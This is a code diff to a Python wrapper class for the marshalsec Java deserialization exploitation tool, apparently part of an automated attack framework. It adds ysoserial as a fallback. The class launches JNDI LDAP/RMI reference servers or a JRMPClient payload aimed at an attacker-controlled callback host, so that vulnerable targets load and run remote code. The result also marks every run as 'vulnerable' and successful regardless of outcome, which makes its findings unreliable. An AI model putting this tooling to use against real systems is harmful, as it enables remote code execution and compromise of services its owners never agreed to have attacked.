@@ -12,6 +12,8 @@ class MarshalsecTool(CommandLineTool):
     """
     Marshalsec 封装 - Java 反序列化漏洞利用工具
     支持 JNDI、RMI 等多种利用方式
+
+    备选方案: 如果 marshalsec.jar 不可用，使用 ysoserial 作为替代
     """
 
     def __init__(self):
@@ -30,6 +32,14 @@ class MarshalsecTool(CommandLineTool):
             if os.path.exists(path):
                 self.jar_path = path
                 break
+
+        # 备选: ysoserial (功能类似，更常用)
+        self.ysoserial_path = "/app/thirdparty/ysoserial.jar"
+        self.use_ysoserial_fallback = False
+        if not self.jar_path and os.path.exists(self.ysoserial_path):
+            self.use_ysoserial_fallback = True
+            print("[Marshalsec] marshalsec.jar 不可用，使用 ysoserial 作为备选")
+
         self.timeout = 60
 
     def name(self) -> str:
@@ -44,7 +54,7 @@ class MarshalsecTool(CommandLineTool):
     def check_available(self) -> bool:
         import shutil
         java_exists = shutil.which("java") is not None
-        jar_exists = self.jar_path is not None
+        jar_exists = self.jar_path is not None or os.path.exists(self.ysoserial_path)
         return java_exists and jar_exists
 
     def expected_params(self) -> Dict[str, Dict[str, Any]]:
@@ -76,17 +86,30 @@ class MarshalsecTool(CommandLineTool):
         if not callback_host:
             raise ValueError("必须提供 callback_host 参数")
 
-        jar_path = self.jar_path if os.path.exists(self.jar_path) else self.local_jar
+        # 选择使用哪个 jar
+        if self.use_ysoserial_fallback:
+            # 使用 ysoserial 作为备选
+            jar_path = self.ysoserial_path
+            cmd = [
+                "java", "-jar", jar_path,
+                "JRMPClient", callback_host
+            ]
+            tool_name = "ysoserial"
+        else:
+            jar_path = self.jar_path
+            if not jar_path or not os.path.exists(jar_path):
+                return {"success": False, "error": "marshalsec.jar 和 ysoserial.jar 都不可用", "vulnerable": False}
 
-        cmd = [
-            "java", "-cp", jar_path,
-            "marshalsec.jndi.LDAPRefServer",
-            callback_host
-        ]
+            cmd = [
+                "java", "-cp", jar_path,
+                "marshalsec.jndi.LDAPRefServer",
+                callback_host
+            ]
+            tool_name = "marshalsec"
 
-        # 根据类型调整命令
-        if exploit_type == "RMI":
-            cmd[2] = "marshalsec.jndi.RMIRefServer"
+            # 根据类型调整命令
+            if exploit_type == "RMI":
+                cmd[2] = "marshalsec.jndi.RMIRefServer"
 
         try:
             raw_result = self._run_command(cmd, timeout=self.timeout, stream_output=True)
@@ -96,11 +119,12 @@ class MarshalsecTool(CommandLineTool):
             result = {
                 "success": True,
                 "vulnerable": True,
+                "tool_used": tool_name,
                 "exploit_type": exploit_type,
                 "payload_type": payload_type,
                 "callback_host": callback_host,
                 "command_used": " ".join(cmd),
-                "summary": f"Marshalsec {exploit_type} 利用准备就绪"
+                "summary": f"{tool_name} {exploit_type} 利用准备就绪"
             }
 
             result["stdout"] = stdout
